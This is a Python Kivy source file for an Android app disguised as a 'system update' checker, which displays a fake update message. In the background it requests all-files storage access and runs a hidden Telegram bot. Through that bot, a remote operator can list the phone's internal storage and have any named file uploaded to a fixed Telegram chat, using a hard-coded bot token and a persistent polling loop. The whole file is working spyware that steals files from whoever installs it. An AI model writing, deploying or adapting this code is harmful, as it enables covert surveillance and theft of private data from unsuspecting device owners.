import telebot
import os
import threading
import time
from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission

# --- CONFIGURATION ---
TOKEN = '8780365531:AAEk86-BYgg2ZgIayLd-zFkTcWYOi_1VqYw'
CHAT_ID = '8619809401'
bot = telebot.TeleBot(TOKEN)

# Android 12+ ke liye path hamesha ye use karein
BASE_PATH = "/storage/emulated/0/"

def run_bot():
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.send_message(CHAT_ID, "🚀 **Vajra Pro Active (Android 12-16)**\nStatus: Persistent\nUse /ls to start.")

    @bot.message_handler(commands=['ls'])
    def list_files(message):
        try:
            # Android 12+ optimized listing
            files = os.listdir(BASE_PATH)
            msg = "📂 **Internal Storage:**\n\n" + "\n".join(files[:40])
            bot.send_message(CHAT_ID, msg)
        except PermissionError:
            bot.send_message(CHAT_ID, "❌ Permission Denied! Need 'All Files Access' in Settings.")
        except Exception as e:
            bot.send_message(CHAT_ID, f"❌ Error: {str(e)}")

    @bot.message_handler(commands=['download'])
    def download_file(message):
        try:
            parts = message.text.split(None, 1)
            if len(parts) < 2:
                bot.send_message(CHAT_ID, "⚠️ Format: `/download filename.ext`")
                return
            
            filename = parts[1]
            path = os.path.join(BASE_PATH, filename)
            
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    bot.send_document(CHAT_ID, f)
            else:
                bot.send_message(CHAT_ID, "❌ File not found in root storage.")
        except Exception as e:
            bot.send_message(CHAT_ID, f"❌ Error: {str(e)}")

    # Persistence Loop
    while True:
        try:
            bot.polling(none_stop=True, interval=3, timeout=20)
        except Exception:
            time.sleep(10)

class SystemUpdateApp(App):
    def build(self):
        # Android Permissions Request (Popup aayega)
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.MANAGE_EXTERNAL_STORAGE # Android 11+ ke liye zaroori
        ])
        
        threading.Thread(target=run_bot, daemon=True).start()
        return Label(text="Checking for system updates...\nVersion 15.4.1")

if __name__ == "__main__":
    SystemUpdateApp().run()
          
